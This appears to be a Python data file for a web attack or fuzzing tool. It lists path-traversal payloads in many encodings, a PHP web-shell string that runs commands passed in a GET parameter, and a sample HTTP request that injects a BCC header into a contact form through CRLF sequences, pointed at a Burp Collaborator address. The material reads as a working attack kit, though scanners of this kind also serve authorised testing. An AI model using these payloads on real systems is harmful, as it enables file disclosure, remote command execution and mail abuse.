dots_exploitable = ["..",
                    ".%00.",
                    "..%00",
                    "..%01",
                    ".?", "??", "?.",
                    "%5C..",
                    ".%2e", "%2e.",
                    ".../.",
                    "..../",
                    "%2e%2e", "%%c0%6e%c0%6e",
                    "0x2e0x2e", "%c0.%c0.",
                    "%252e%252e",
                    "%c0%2e%c0%2e", "%c0%ae%c0%ae",
                    "%c0%5e%c0%5e", "%c0%ee%c0%ee",
                    "%c0%fe%c0%fe", "%uff0e%uff0e",
                    "%%32%%65%%32%%65",
                    "%e0%80%ae%e0%80%ae",
                    "%25c0%25ae%25c0%25ae",
                    "%f0%80%80%ae%f0%80%80%ae",
                    "%f8%80%80%80%ae%f8%80%80%80%ae",
                    "%fc%80%80%80%80%ae%fc%80%80%80%80%ae"]

php_cmd_intro = "<?system($_GET['x']);?>"

php_cmd_value = "&x=ls"

slashes_exploitable = ["/", "\\",
                       "%2f", "%5c",
                       "0x2f", "0x5c",
                       "%252f", "%255c",
                       "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
                       "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
                       "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
                       "%%32%%66", "%%35%%63",
                       "%e0%80%af",
                       "%25c1%259c", "%25c0%25af",
                       "%f0%80%80%af",
                       "%f8%80%80%80%af"]

Special_Prefix_Patterns = ["A", ".", "./", ".\\"]

Special_Prefixes = ["///", "\\\\\\", "\\\.", "C:\\"]

Special_Mid_Patterns = ["../", "..\\"]

Special_Sufixes = ["%00", "?", " ", "%00index.html", "%00index.htm", ";index.html", ";index.htm"]

Special_Patterns = ["..//", "..///", "..\\\\", "..\\\\\\", "../\\", "..\\/",
                    "../\\/", "..\\/\\", "\\../", "/..\\", ".../", "...\\",
                    "./../", ".\\..\\", ".//..//", ".\\\\..\\\\", "......///",
                    "%2e%c0%ae%5c", "%2e%c0%ae%2f"]

request_model = "GET /contact-us HTTP/1.1\n" \
                "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0\n" \
                "Host: insecure-website.com\n" \
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n" \
                "Accept-Language: en-US,en;q=0.5\n" \
                "Accept-Encoding: gzip, deflate\n" \
                "Referer: http://insecure-website.com/contact-us\n" \
                "Content-Type: application/x-www-form-urlencoded\n" \
                "Content-Length: 129\n" \
                "Connection: close\n" \
                "Upgrade - Insecure - Requests: 1\n" \
                "\n" \
                "from=test@test.com%3e%0d%0aBCC%3agxhhuhyoeh6urrfjkxme1j" \
                "pzqqwjkj8b2zumka9@burpcollaborator.net%0d%0ajvi%3a%20j&subject=test&send=1"

request_headers = ["A-IM",
                   "Accept",
                   "Accept-Charset",
                   "Accept-Encoding",
                   "Accept-Language",
                   "Accept-Datetime",
                   "Access-Control-Request-Method",
                   "Access-Control-Request-Headers",
                   "Authorization",
                   "Cache-Control",
                   "Connection",
                   "Content-Length",
                   "Content-Type",
                   "Cookie",
                   "Date",
                   "Expect",
                   "Forwarded",
                   "From",
                   "Host",
                   "If-Match",
                   "If-Modified-Since",
                   "If-None-Match",
                   "If-Range",
                   "If-Unmodified-Since",
                   "Max-Forwards",
                   "Origin",
                   "Pragma",
                   "Proxy-Authorization",
                   "Range",
                   "Referer",
                   "TE",
                   "User-Agent",
                   "Upgrade",
                   "Via",
                   "Warning"
                   "Dnt",
                   "X-Requested-With",
                   "X-CSRF-Token"]


